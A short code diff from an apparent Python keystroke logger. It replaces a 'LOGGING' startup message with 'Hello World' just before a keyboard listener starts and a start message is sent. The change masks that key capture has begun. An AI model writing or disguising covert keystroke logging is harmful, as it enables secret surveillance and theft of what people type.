@@ -37,7 +37,7 @@ def on_release(key):
         return True
 
 def start_logging():
-    print('LOGGING')
+    print("Hello World")
     send_application_start_message()
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
